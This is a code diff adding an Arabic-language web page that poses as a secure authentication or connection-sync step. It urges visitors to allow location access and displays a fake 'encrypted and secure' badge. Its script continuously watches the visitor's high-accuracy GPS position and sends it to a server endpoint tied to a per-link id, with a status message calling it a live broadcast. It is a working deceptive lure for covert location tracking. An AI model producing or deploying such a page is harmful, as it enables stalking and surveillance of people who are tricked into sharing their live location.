@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق الآمن...</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+        @keyframes pulse-slow { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.05); } }
+        .animate-pulse-slow { animation: pulse-slow 3s infinite ease-in-out; }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center p-4 font-sans">
+    <div class="w-full max-w-md bg-slate-900/80 backdrop-blur-xl border border-slate-800 rounded-3xl p-8 shadow-2xl text-center relative overflow-hidden">
+        <div class="absolute -top-24 -right-24 w-48 h-48 bg-blue-500/10 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute -bottom-24 -left-24 w-48 h-48 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="relative w-20 h-20 mx-auto mb-6 bg-slate-800/80 border border-slate-700/60 rounded-2xl flex items-center justify-center shadow-inner animate-pulse-slow">
+            <svg class="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 21c4.97 0 9-4.03 9-9s-4.03-9-9-9-9 4.03-9 9 4.03 9 9 9z"></path>
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3"></path>
+            </svg>
+        </div>
+
+        <h1 class="text-xl font-bold tracking-tight text-white mb-2">جاري مزامنة الاتصال</h1>
+        <p class="text-xs text-slate-400 mb-8 leading-relaxed">الرجاء السماح بالوصول للموقع لإتمام المصادقة بنجاح.</p>
+
+        <div id="status-card" class="bg-slate-950/60 border border-slate-800/80 rounded-2xl p-4 mb-6 flex items-center gap-3 transition-all duration-300">
+            <div id="loader-spinner" class="w-5 h-5 border-2 border-blue-500 border-t-transparent rounded-full animate-spin shrink-0"></div>
+            <p id="status" class="text-sm text-slate-300 font-medium text-right">في انتظار منح الصلاحية...</p>
+        </div>
+
+        <div class="flex items-center justify-center gap-2 text-xs text-slate-500">
+            <svg class="w-4 h-4 text-emerald-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75m-6-7.5h6A2.25 2.25 0 0117.25 4.5v15a2.25 2.25 0 01-2.25 2.25H9A2.25 2.25 0 016.75 19.5v-15A2.25 2.25 0 019 2.25z"></path></svg>
+            <span>اتصال مشفر وآمن</span>
+        </div>
+    </div>
+
+    <script>
+        let lastSendTime = 0;
+        const THROTTLE_DELAY = 4000;
+
+        function sendLocationToServer(lat, lon) {
+            const now = Date.now();
+            if (now - lastSendTime < THROTTLE_DELAY) return;
+            lastSendTime = now;
+
+            fetch('/api/update-loc', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: '${linkId}', lat, lon })
+            }).catch(err => console.log(err));
+        }
+
+        const statusText = document.getElementById("status");
+        const statusCard = document.getElementById("status-card");
+        const loader = document.getElementById("loader-spinner");
+
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    statusText.innerText = "تمت المزامنة بنجاح، البث الحي نشط...";
+                    statusCard.classList.remove("border-slate-800/80");
+                    statusCard.classList.add("border-emerald-500/40", "bg-emerald-950/10");
+                    loader.classList.remove("border-blue-500");
+                    loader.classList.add("border-emerald-500");
+                    sendLocationToServer(lat, lon);
+                },
+                (error) => {
+                    statusText.innerText = "يرجى النقر على (سماح / Allow) للمتابعة.";
+                    statusCard.classList.remove("border-slate-800/80");
+                    statusCard.classList.add("border-amber-500/40", "bg-amber-950/10");
+                    loader.style.display = "none";
+                },
+                { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
+            );
+        }
+    </script>
+</body>
+</html>
